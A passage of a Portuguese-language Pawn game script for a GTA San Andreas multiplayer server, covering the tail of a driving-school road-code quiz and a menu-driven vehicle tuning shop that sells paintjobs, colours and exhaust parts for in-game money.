					format(string, sizeof(string), "\n{FF9900}A todos os carros da polícia e hospital que assinalem marcha de urgência"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_CODIGO3, DIALOG_STYLE_LIST, "{FFFF00}CÓDIGO DA ESTRADA", sdialog, "Selecionar", "Sair");
		        }
		    }
		}
		case DIALOG_CODIGO3:
		{
		    if(!response)
		    {
				format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}A que carros devo dar prioridade?"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FF9900}A todos os carros da polícia e hospital"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FF9900}A todos os veículos de emergência"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FF9900}A todos os veículos com os 4 piscas ligados"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{FF9900}A todos os carros da polícia e hospital que assinalem marcha de urgência"); strcat(sdialog,string);

				return ShowPlayerDialog(playerid, DIALOG_CODIGO3, DIALOG_STYLE_LIST, "{FFFF00}CÓDIGO DA ESTRADA", sdialog, "Selecionar", "Sair");
		    }
		    
		    switch(listitem)
			{
			    case 0:
			    {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}A que carros devo dar prioridade?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}A todos os carros da polícia e hospital"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}A todos os veículos de emergência"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}A todos os veículos com os 4 piscas ligados"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}A todos os carros da polícia e hospital que assinalem marcha de urgência"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_CODIGO3, DIALOG_STYLE_LIST, "{FFFF00}CÓDIGO DA ESTRADA", sdialog, "Selecionar", "Sair");
				}
				case 1:
				{
				    return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Erraste no Código da Estrada!");
				}
				case 2:
				{
				    return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Erraste no Código da Estrada!");
				}
				case 3:
				{
				    return SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Erraste no Código da Estrada!");
				}
				case 4: // certa
				{
				    SendClientMessage(playerid, COLOR_CHAT, "[ESCOLA DE CONDUÇÃO] {FFFFFF}Parabéns, passaste no Código da Estrada!");
				    
				    pInfo[playerid][Codigo] = 1;
				}
			}
			return 1;
		}
	}
	
	// --------------------------------------- SISTEMA DE TUNNING BY KLAP ---------------------------------------

	new car = GetPlayerVehicleID(playerid);

	if(dialogid == DIALOG_TUNNING)
	{
		if(response)
		{
			if(listitem == 0) //Paintjobs
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+1, DIALOG_STYLE_LIST, "PaintJob's:", "Paint Job 1\nPaint Job 2\nPaint Job 3\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 1) //Colors
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+2, DIALOG_STYLE_LIST, "Cores:", "Preto\nBranco\nVermelho\nAzul\nVerde\nAmarelo\nRosa\nCastanho\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 2) //Exhausts
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 3) //Front Bumpers
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+4, DIALOG_STYLE_LIST, "Front Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 4) //Rear Bumpers
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 5) //Roofs
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 6) //Spoilers
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Select", "Exit");
			}
			if(listitem == 7) //SideSkirts
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
			}
            if(listitem == 8) //Bullbars
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+9, DIALOG_STYLE_LIST, "Bullbar", "Locos Low Chrome Grill\nLocos Low Chrome Bars\nLocos Low Chrome Lights\nLocos Low Chrome Bullbar\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 9) //Wheels
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+10, DIALOG_STYLE_LIST, "Rodas:", "Offroad\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nNext Page\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 10) //Car stereo
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+11, DIALOG_STYLE_LIST, "Car Stereo:", "Bass Boost\nSuper Bass Boost\nUltra Bass Boost\nKing Bass Boost\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 11) //Tune car menu 2
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+12, DIALOG_STYLE_LIST, "Tuning Menu:", "Hidréulicos - 12.000é\nNitro x10 - 30.000é\nReparar Carro - 2.000é\nNeon - 15.000é\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 12) //Wheels2
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING+13, DIALOG_STYLE_LIST, "Rodas:", "Trance\nShadow\nRimshine\nClassic\nCutter\nSwitch\nDollar\nVoltar", "Selecionar", "Exit");
			}
       }
   	}
   	if(dialogid == DIALOG_TUNNING+1) //Paintjobs
   	{
		if(response)
		{

		    if(GetPlayerMoneyEx(playerid) < 35000)
		    {
		        SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
		        return 1;
            }
			if(listitem == 0)
			{
				if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560 ||
				GetVehicleModel(car) == 575 ||
				GetVehicleModel(car) == 534 ||
				GetVehicleModel(car) == 567 ||
				GetVehicleModel(car) == 536 ||
				GetVehicleModel(car) == 535 ||
				GetVehicleModel(car) == 576 ||
				GetVehicleModel(car) == 558)
		        {
		            GivePlayerMoneyEx(playerid, -35000);

					cInfo[car][mod1] = 0;

					ChangeVehiclePaintjob(car,0);
					PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					SendClientMessage(playerid,COLOR_WHITE,"PaintJob número 1 adicionado ao veículo.");
                    ShowPlayerDialog(playerid, DIALOG_TUNNING+1, DIALOG_STYLE_LIST, "PaintJobs:", "Paint Job 1\nPaint Job 2\nPaint Job 3\nVoltar", "Select", "Exit");
				}
				else
				{
				   SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não é permitido ter PaintJob nesse veículo");
			       ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tuning Menu:","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nNext page", "Select", "Exit");
				}
			}
			if(listitem == 1)
			{
				if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560 ||
				GetVehicleModel(car) == 575 ||
				GetVehicleModel(car) == 534 ||
				GetVehicleModel(car) == 567 ||
				GetVehicleModel(car) == 536 ||
				GetVehicleModel(car) == 535 ||
				GetVehicleModel(car) == 576 ||
				GetVehicleModel(car) == 558)
                {
                    GivePlayerMoneyEx(playerid, -35000);

                    cInfo[car][mod1] = 1;
                    
					ChangeVehiclePaintjob(car,1);
					PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					SendClientMessage(playerid,COLOR_WHITE,"PaintJob número 2 adicionado ao veículo.");
                    ShowPlayerDialog(playerid, DIALOG_TUNNING+1, DIALOG_STYLE_LIST, "PaintJobs:", "Paint Job 1\nPaint Job 2\nPaint Job 3\nVoltar", "Select", "Exit");
				}
				else
				{
				   SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não é permitido ter PaintJob nesse veículo");
			       ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tune car menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nNext page", "Select", "Exit");
				}
			}
			if(listitem == 2)
			{
				if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560 ||
				GetVehicleModel(car) == 575 ||
				GetVehicleModel(car) == 534 ||
				GetVehicleModel(car) == 567 ||
				GetVehicleModel(car) == 536 ||
				GetVehicleModel(car) == 535 ||
				GetVehicleModel(car) == 576 ||
				GetVehicleModel(car) == 558)
			    {
   				   GivePlayerMoneyEx(playerid, -35000);
   				   
   				   cInfo[car][mod1] = 2;

                   ChangeVehiclePaintjob(car,2);
                   PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
				   SendClientMessage(playerid,COLOR_WHITE,"PaintJob número 3 adicionado ao veículo.");
                   ShowPlayerDialog(playerid, DIALOG_TUNNING+1, DIALOG_STYLE_LIST, "Select a Paintjob", "Paint Job 1\nPaint Job 2\nPaint Job 3\nVoltar", "Select", "Exit");
				}
				else
				{
				   SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não é permitido ter PaintJob nesse veículo");
			       ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tune car menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nNext page", "Selecionar", "Sair");
				}
			}
			if(listitem == 3)
			{
				ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tune car menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nNext page", "Selecionar", "Sair");
			}
	   }
   	}
   	if(dialogid == DIALOG_TUNNING+2) //Colours
   	{
		if(response)
		{

			if(GetPlayerMoneyEx(playerid) < 2000)
		    {
		        SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
		        return 1;
            }
			if(listitem == 0)
			{
			        GivePlayerMoneyEx(playerid, -2000);

		            ChangeVehicleColor(car,0,0);//Preto
		            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		            SendClientMessage(playerid,COLOR_CHAT,"Pintaste teu carro de Preto.");
		            ShowPlayerDialog(playerid, DIALOG_TUNNING+2, DIALOG_STYLE_LIST, "Cor:", "Preto\nBranco\nVermelho\nAzul\nVerde\nAmarelo\nRosa\nCastanho\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 1)
			{
			        GivePlayerMoneyEx(playerid, -2000);

			        ChangeVehicleColor(car,1,1);//Branco
			        PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			        SendClientMessage(playerid,COLOR_CHAT,"Pintaste teu carro de Branco.");
			        ShowPlayerDialog(playerid, DIALOG_TUNNING+2, DIALOG_STYLE_LIST, "Select a Color", "Preto\nBranco\nVermelho\nAzul\nVerde\nAmarelo\nRosa\nCastanho\nVoltar", "Selecionar", "Sair");

			}
			if(listitem == 2)
			{
			        GivePlayerMoneyEx(playerid, -2000);

			        ChangeVehicleColor(car,3,3);//Vermelho
			        PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			        SendClientMessage(playerid,COLOR_CHAT,"Pintaste teu carro de Vermelho.");
			        ShowPlayerDialog(playerid, DIALOG_TUNNING+2, DIALOG_STYLE_LIST, "Select a Color", "Preto\nBranco\nVermelho\nAzul\nVerde\nAmarelo\nRosa\nCastanho\nVoltar", "Selecionar", "Sair");

			}
			if(listitem == 3)
			{
			        GivePlayerMoneyEx(playerid, -2000);

			        ChangeVehicleColor(car,79,79); //Azul
			        PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			        SendClientMessage(playerid,COLOR_CHAT,"Pintaste teu carro de Azul.");
			        ShowPlayerDialog(playerid, DIALOG_TUNNING+2, DIALOG_STYLE_LIST, "Select a Color", "Preto\nBranco\nVermelho\nAzul\nVerde\nAmarelo\nRosa\nCastanho\nVoltar", "Selecionar", "Sair");

			}
			if(listitem == 4)
			{
			        GivePlayerMoneyEx(playerid, -2000);

			        ChangeVehicleColor(car,86,86);//Verde
			        PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			        SendClientMessage(playerid,COLOR_CHAT,"Pintaste teu carro de Verde.");
			        ShowPlayerDialog(playerid, DIALOG_TUNNING+2, DIALOG_STYLE_LIST, "Select a Color", "Preto\nBranco\nVermelho\nAzul\nVerde\nAmarelo\nRosa\nCastanho\nVoltar", "Selecionar", "Sair");

			}
			if(listitem == 5)
			{
			        GivePlayerMoneyEx(playerid, -2000);

			        ChangeVehicleColor(car,6,6);//Amarelo
			        PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			        SendClientMessage(playerid,COLOR_CHAT,"Pintaste teu carro de Amarelo.");
			        ShowPlayerDialog(playerid, DIALOG_TUNNING+2, DIALOG_STYLE_LIST, "Select a Color", "Preto\nBranco\nVermelho\nAzul\nVerde\nAmarelo\nRosa\nCastanho\nVoltar", "Selecionar", "Sair");

			}
			if(listitem == 6)
           	{
                    GivePlayerMoneyEx(playerid, -2000);

			        ChangeVehicleColor(car,126,126);//Rosa
			        PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			        SendClientMessage(playerid,COLOR_CHAT,"Pintaste teu carro de Rosa.");
			        ShowPlayerDialog(playerid, DIALOG_TUNNING+2, DIALOG_STYLE_LIST, "Select a Color", "Preto\nBranco\nVermelho\nAzul\nVerde\nAmarelo\nRosa\nCastanho\nVoltar", "Selecionar", "Sair");
			}
			if(listitem == 7)
			{
			        GivePlayerMoneyEx(playerid, -2000);

					ChangeVehicleColor(car,66,66);//Castanho
			        PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	          		SendClientMessage(playerid,COLOR_CHAT,"Pintaste teu carro de Castanho.");
			        ShowPlayerDialog(playerid, DIALOG_TUNNING+2, DIALOG_STYLE_LIST, "Select a Color", "Preto\nBranco\nVermelho\nAzul\nVerde\nAmarelo\nRosa\nCastanho\nVoltar", "Selecionar", "Sair");
            }
            if(listitem == 8)
			{
        		    ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nCores\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nRodas\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
            }
		}
   	}
   	if(dialogid == DIALOG_TUNNING+3) //Exhausts
   	{
		if(response)
		{
			if(GetPlayerMoneyEx(playerid) < 10000)
   			{
      			SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        	return 1;
     		}
			if(listitem == 0)//Wheel Arch Cars Alien Exausts
			{
                if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560)
		        {
		            if(GetVehicleModel(car) == 562)
		            {
		                GivePlayerMoneyEx(playerid, -10000);

		            	AddVehicleComponentEx(car,1034);
		            	PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		            	SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Alien.");
		            	ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 565)
					{
					    GivePlayerMoneyEx(playerid, -10000);
					    AddVehicleComponentEx(car,1046);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Alien.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 559)
					{
					    GivePlayerMoneyEx(playerid, -10000);

					    AddVehicleComponentEx(car,1065);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Alien.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 561)
					{
					    GivePlayerMoneyEx(playerid, -10000);
	
					    AddVehicleComponentEx(car,1064);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Alien.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 560)
					{
					    GivePlayerMoneyEx(playerid, -10000);

					    AddVehicleComponentEx(car,1028);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Alien.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 558)
					{
					    GivePlayerMoneyEx(playerid, -10000);

					    AddVehicleComponentEx(car,1089);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
				 	    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Alien.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
	    			}
   				}
	  			else
				{
				   	SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nCores\nEscapes\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nRodas\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
     			}
            }
			if(listitem == 1)//Wheel Arch Cars X-Flow Exausts
            {
                if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560)
                {
                	GivePlayerMoneyEx(playerid, -10000);

			        if(GetVehicleModel(car) == 562)
			        {
			            AddVehicleComponentEx(car,1037);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape AlienArch X-Flow.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 565)
					{
					    AddVehicleComponentEx(car,1045);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape AlienArch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 559)
					{
					    AddVehicleComponentEx(car,1066);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape AlienArch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 561)
					{
					    AddVehicleComponentEx(car,1059);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape AlienArch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 560)
					{
					    AddVehicleComponentEx(car,1029);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape AlienArch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 558)
					{
					    AddVehicleComponentEx(car,1092);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape AlienArch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nCores\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nRodas\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
            }
			if(listitem == 2)//Locos Low Co. Cars Chromer Exausts
            {
                if(GetVehicleModel(car) == 575 ||
				GetVehicleModel(car) == 534 ||
				GetVehicleModel(car) == 567 ||
				GetVehicleModel(car) == 536 ||
				GetVehicleModel(car) == 576 ||
				GetVehicleModel(car) == 535)
			    {
			        GivePlayerMoneyEx(playerid, -10000);

			        if(GetVehicleModel(car) == 575)
			        {
			            AddVehicleComponentEx(car,1044);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		             	SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Locos Low Chromer.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 534)
					{
					    AddVehicleComponentEx(car,1126);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Locos Low Chromer.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 567)
					{
					    AddVehicleComponentEx(car,1129);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	                    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Locos Low Chromer.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 536)
					{
					    AddVehicleComponentEx(car,1104);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Locos Low Chromer.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 535)
					{
					    AddVehicleComponentEx(car,1113);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Locos Low Chromer.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 576)
					{
					    AddVehicleComponentEx(car,1136);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					   	SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Locos Low Chromer.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
					SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nCores\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nRodas\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
            }
			if(listitem == 3)//Locos Low Co. Cars Salmin Exausts
            {
                if(GetVehicleModel(car) == 575 ||
				GetVehicleModel(car) == 534 ||
				GetVehicleModel(car) == 567 ||
				GetVehicleModel(car) == 536 ||
				GetVehicleModel(car) == 576 ||
				GetVehicleModel(car) == 535)
			    {
			        GivePlayerMoneyEx(playerid, -10000);

			        if(GetVehicleModel(car) == 575)
			        {
			            AddVehicleComponentEx(car,1043);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"You have succesfully added Locos Low Slamin Exhaust component on Brodway.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+3, DIALOG_STYLE_LIST, "Escapes:", "Wheel Arch Alien Exhaust\nWheel Arch X-Flow Exhaust\nLocos Low Chromer Exhaust\nLocos Low Slamin Exhaust\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 534)
					{
					    AddVehicleComponentEx(car,1127);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Escape Locos Low Slamin.");
